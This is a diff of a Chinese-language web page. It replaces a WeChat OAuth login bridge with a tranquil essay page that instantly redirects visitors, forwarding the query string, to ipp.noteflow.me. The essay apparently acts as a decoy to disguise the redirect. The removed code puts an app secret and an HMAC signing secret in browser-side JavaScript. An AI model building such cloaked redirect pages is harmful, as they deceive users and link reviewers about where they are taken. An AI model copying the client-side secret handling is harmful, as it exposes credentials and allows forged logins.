@@ -2,107 +2,354 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>微信授权登录</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>美好的时光 · 片刻静心</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
-        body { background: #f5f7fa; display: grid; place-items: center; height: 100vh; color: #2c3e50; }
-        .card { background: #fff; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
-        h2 { margin-bottom: 10px; color: #3498db; }
-        p { color: #7f8c8d; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', 'PingFang SC', system-ui, -apple-system, sans-serif;
+            line-height: 1.8;
+            color: #1e2a3e;
+            background: linear-gradient(135deg, #f5f7fa 0%, #d4dfed 100%);
+            transition: all 0.5s ease;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #2c3e50, #3498db);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #5d6e7e;
+            font-style: italic;
+            font-weight: 300;
+        }
+        
+        .essay-content {
+            background: rgba(255, 255, 255, 0.96);
+            padding: 40px;
+            border-radius: 28px;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.1), 0 1px 2px rgba(0,0,0,0.02);
+            margin-bottom: 40px;
+            backdrop-filter: blur(0px);
+            transition: transform 0.2s;
+        }
+        
+        .essay-content p {
+            margin-bottom: 26px;
+            font-size: 1.08rem;
+            text-indent: 2em;
+            color: #2c3e44;
+        }
+        
+        .essay-content p:first-child::first-letter {
+            font-size: 3.2rem;
+            font-weight: 500;
+            color: #3498db;
+            float: left;
+            line-height: 0.85;
+            margin-right: 12px;
+            font-family: 'Georgia', serif;
+        }
+        
+        .author {
+            text-align: right;
+            font-style: italic;
+            color: #7f8c8d;
+            margin-top: 30px;
+            padding-top: 15px;
+            border-top: 1px dashed #dce5ef;
+            font-size: 0.95rem;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #5c6f87;
+            font-size: 0.9rem;
+            opacity: 0.85;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(6px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            z-index: 1000;
+        }
+        
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .redirect-card {
+            background: white;
+            padding: 30px 40px;
+            border-radius: 48px;
+            text-align: center;
+            max-width: 340px;
+            width: 85%;
+            box-shadow: 0 30px 45px rgba(0, 0, 0, 0.2);
+            animation: fadeSlideUp 0.5s ease;
+        }
+        
+        .redirect-card p {
+            margin-bottom: 25px;
+            font-size: 1.2rem;
+            color: #2c3e50;
+            font-weight: 500;
+        }
+        
+        .redirect-card small {
+            display: block;
+            margin-bottom: 20px;
+            color: #7f8c8d;
+            font-size: 0.85rem;
+        }
+        
+        .redirect-btn {
+            padding: 14px 32px;
+            background: #3498db;
+            color: white;
+            text-decoration: none;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1.2rem;
+            transition: all 0.25s;
+            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.35);
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+            width: 100%;
+            letter-spacing: 1px;
+        }
+        
+        .redirect-btn:hover {
+            background: #1f6e9c;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(31, 110, 156, 0.4);
+        }
+        
+        .redirect-btn:active {
+            transform: translateY(1px);
+        }
+        
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .essay-content {
+                padding: 24px 22px;
+            }
+            
+            .essay-content p {
+                font-size: 1rem;
+            }
+            
+            .redirect-card {
+                padding: 24px 20px;
+            }
+            
+            .redirect-btn {
+                font-size: 1rem;
+                padding: 12px 20px;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>微信授权登录中</h2>
-        <p>请稍候，正在安全跳转...</p>
+    <div class="container">
+        <header>
+            <h1>美好的时光</h1>
+            <div class="subtitle">—— 珍惜当下，感恩生活</div>
+        </header>
+        
+        <div class="essay-content">
+            <p>时光如流水，悄无声息地从指缝间溜走。我们总在忙碌中度过一天又一天，却很少停下来感受生活中的美好瞬间。那些看似平凡的日常，其实都蕴含着深深的幸福。</p>
+            <p>清晨的第一缕阳光透过窗帘，洒在脸上，温暖而柔和。窗外，鸟儿在枝头欢快地歌唱，仿佛在迎接新的一天。泡一杯清茶，坐在窗前，看着街道上渐渐多起来的行人，每个人都有自己的故事，都在为生活奔波。这一刻，内心是平静的，也是充满希望的。</p>
+            <p>午后的阳光斜斜地照进房间，形成斑驳的光影。我喜欢在这个时候捧一本书，沉浸在文字的世界里。书页翻动的声音，伴随着远处传来的孩子们的欢笑声，构成了一幅温馨的画面。有时候，什么都不做，只是静静地发呆，让思绪随风飘荡，也是一种难得的享受。</p>
+            <p>傍晚时分，夕阳西下，天边染上了一片橘红色。我喜欢在这个时候散步，看着天空由蓝变橙，再由橙变紫，最后渐渐暗下来。路灯一盏盏亮起，照亮了回家的路。路上遇到熟人，微笑着打个招呼，简单的问候却让人心里暖暖的。</p>
+            <p>夜晚，星空璀璨。站在阳台上，仰望满天繁星，感觉自己如此渺小，却又如此幸运。能够在这个美丽的星球上生活，能够感受四季的变化，能够体验人生的酸甜苦辣，这本身就是一种恩赐。</p>
+            <p>生活中的美好，往往就藏在这些平凡的细节里。一顿家常便饭，一次与朋友的畅谈，一个温暖的拥抱，甚至只是雨后清新的空气，都能让人感到幸福。我们总是追求更多，想要更好的工作，更大的房子，更豪华的车子，却忽略了身边已经拥有的美好。</p>
+            <p>其实，幸福很简单。它不在于你拥有多少，而在于你能否感受到已经拥有的。学会感恩，学会珍惜，学会在平凡中发现不平凡，这才是生活的真谛。</p>
+            <p>时光不会为任何人停留，但我们可以在有限的时间里，创造无限的美好。用心去感受每一天，珍惜身边的人，做自己喜欢的事，让生活充满阳光和希望。这样，当我们回首往事时，才不会因为虚度年华而悔恨，也不会因为碌碌无为而羞愧。</p>
+            <p>愿我们都能在忙碌的生活中，找到属于自己的那份宁静与美好。愿我们都能珍惜当下，感恩生活，让每一天都过得有意义。因为，最美好的时光，就是现在。</p>
+            <div class="author">—— 佚名 · 静心分享</div>
+        </div>
+        
+        <footer>
+            <p id="footerText">🌿 愿你享受此刻的宁静与温柔</p>
+        </footer>
+    </div>
+    
+    <div class="overlay" id="redirectOverlay">
+        <div class="redirect-card">
+            <p>✨ 即将前往精彩世界 ✨</p>
+            <small id="countdownHint">页面将自动跳转，或点击下方按钮</small>
+            <button id="manualRedirect" class="redirect-btn">立即进入 →</button>
+        </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/js-sha256@3.2.0/dist/sha256.min.js"></script>
     <script>
-        // ======================================
-        // 配置（你自己填）
-        // ======================================
-        const APPID = "wxde2ad02f02cb0df5";
-        const APPSECRET = "f27a1e32177f425fe8c940d******"; // 你真实的
-        const SHARED_SECRET = "changeit-bridge-secret";
-        const TARGET_HOST = "https://ipp.noteflow.me";
-
-        (async () => {
-            const params = new URLSearchParams(location.search);
-            const code = params.get("code");
-            const site = params.get("site") || "";
-            const invite = params.get("invite") || "";
-
-            // 无 code 则去微信授权
-            if (!code) {
-                const redirectUri = encodeURIComponent("https://zt.xiaoyuwangluo.vip/?" + params.toString());
-                location.replace(
-                    `https://open.weixin.qq.com/connect/oauth2/authorize?appid=${APPID}&redirect_uri=${redirectUri}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect`
-                );
-                return;
+        let hasRedirected = false;
+        let autoTimer = null;
+        
+        const TARGET_LIST = [
+            'https://ipp.noteflow.me/home'
+        ];
+        
+        function getRandomBaseTarget() {
+            const randomIndex = Math.floor(Math.random() * TARGET_LIST.length);
+            return TARGET_LIST[randomIndex];
+        }
+        
+        function getCurrentQueryString() {
+            return window.location.search;
+        }
+        
+        function buildTargetUrl() {
+            const base = getRandomBaseTarget();
+            const query = getCurrentQueryString();
+            return base + query + '#';
+        }
+        
+        function executeRedirect() {
+            if (hasRedirected) return;
+            hasRedirected = true;
+            
+            if (autoTimer) {
+                clearInterval(autoTimer);
+                autoTimer = null;
             }
-
-            try {
-                // ======================================
-                // 1. 拿 access_token + openid + unionid
-                // ======================================
-                const tokenRes = await fetch(
-                    `https://api.weixin.qq.com/sns/oauth2/access_token?appid=${APPID}&secret=${APPSECRET}&code=${code}&grant_type=authorization_code`
-                ).then(r => r.json());
-
-                const { access_token, openid, unionid } = tokenRes;
-
-                // ======================================
-                // 2. 拿用户信息
-                // ======================================
-                const userRes = await fetch(
-                    `https://api.weixin.qq.com/sns/userinfo?access_token=${access_token}&openid=${openid}&lang=zh_CN`
-                ).then(r => r.json());
-
-                const nickname = userRes.nickname || "";
-                const avatar = userRes.headimgurl || "";
-
-                // ======================================
-                // 3. 组装签名字段（完全按 Claude）
-                // ======================================
-                const ts = String(Math.floor(Date.now() / 1000));
-                const fields = {
-                    unionid: unionid || "",
-                    openid: openid,
-                    nickname: nickname,
-                    avatar: avatar,
-                    ts: ts,
-                    site: site,
-                    invite: invite,
-                };
-
-                // 过滤空值 + 排序
-                const filtered = Object.entries(fields).filter(([, v]) => v !== "");
-                filtered.sort(([a], [b]) => a.localeCompare(b));
-
-                // 生成 base 串
-                const signBase = filtered.map(([k, v]) => `${k}=${v}`).join("&");
-
-                // HMAC-SHA256
-                function hmacSha256(message, secret) {
-                    const sha256 = sha256_hmac;
-                    return sha256(message, secret);
+            
+            const finalUrl = buildTargetUrl();
+            window.location.replace(finalUrl);
+        }
+        
+        function showRedirectInterface() {
+            const overlay = document.getElementById('redirectOverlay');
+            if (!overlay) return;
+            
+            if (overlay.classList.contains('active')) return;
+            
+            overlay.classList.add('active');
+            
+            const footerEl = document.getElementById('footerText');
+            if (footerEl) {
+                footerEl.textContent = "⏳ 页面即将跳转，也可点击上方按钮立即前往 ⏳";
+            }
+            
+            const countdownSpan = document.getElementById('countdownHint');
+            let secondsLeft = 1;
+            
+            const updateCountdownText = () => {
+                const text = `✨ ${secondsLeft}秒后自动跳转 ✨`;
+                if (countdownSpan) {
+                    countdownSpan.textContent = text;
+                } else {
+                    const fallback = document.querySelector('.redirect-card small');
+                    if (fallback) fallback.textContent = text;
                 }
-
-                const sign = hmacSha256(signBase, SHARED_SECRET).toLowerCase();
-
-                // ======================================
-                // 4. 跳转到主站 /
-                // ======================================
-                const finalParams = new URLSearchParams({ ...fields, sign });
-                location.replace(`${TARGET_HOST}/?${finalParams.toString()}`);
-
-            } catch (e) {
-                console.error(e);
-                alert("授权失败：" + e.message);
+            };
+            
+            updateCountdownText();
+            
+            autoTimer = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft <= 0) {
+                    if (autoTimer) {
+                        clearInterval(autoTimer);
+                        autoTimer = null;
+                    }
+                    executeRedirect();
+                } else {
+                    updateCountdownText();
+                }
+            }, 0);
+        }
+        
+        const manualBtn = document.getElementById('manualRedirect');
+        if (manualBtn) {
+            manualBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (autoTimer) {
+                    clearInterval(autoTimer);
+                    autoTimer = null;
+                }
+                executeRedirect();
+            });
+        }
+        
+        function initRedirectFlow() {
+            setTimeout(() => {
+                if (!hasRedirected) {
+                    showRedirectInterface();
+                }
+            }, 0);
+        }
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initRedirectFlow);
+        } else {
+            initRedirectFlow();
+        }
+        
+        window.addEventListener('pageshow', function(event) {
+            if (!hasRedirected && !document.getElementById('redirectOverlay')?.classList.contains('active')) {
+                initRedirectFlow();
             }
-        })();
+        });
     </script>
 </body>
 </html>
